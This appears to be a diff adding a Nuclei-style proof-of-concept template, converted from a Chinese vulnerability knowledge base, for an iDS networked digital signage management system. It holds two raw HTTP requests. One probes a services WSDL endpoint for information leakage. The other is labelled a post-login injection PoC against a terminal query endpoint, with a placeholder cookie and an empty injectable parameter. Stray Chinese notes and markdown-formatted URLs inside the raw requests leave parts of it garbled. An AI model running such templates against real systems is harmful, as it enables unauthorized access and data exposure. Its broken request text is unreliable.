@@ -1,0 +1,54 @@
+id: poc-nyxxtnyd14nn5esd
+info:
+  name: iDS联网数字标牌管理系统services存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nyxxtnyd14nn5esd'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nyxxtnyd14nn5esd
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /services/TaskLoad?wsdl HTTP/1.1
+
+
+    后台注入POC：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /Pages/terminal!query HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+    Content-Length: 229
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Cookie: 登陆后cookie
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Referer: [http://127.0.0.1/Pages/terminal.action](http://127.0.0.1/Pages/terminal.action)
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Encoding: gzip
+
+
+    ascDesc=asc&hardware=true&orderBy=1&page.currentPage=1&page.pageSize=20&terminalparam.groupId=0&terminalparam.includeChildren=false&terminalparam.searchKey='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
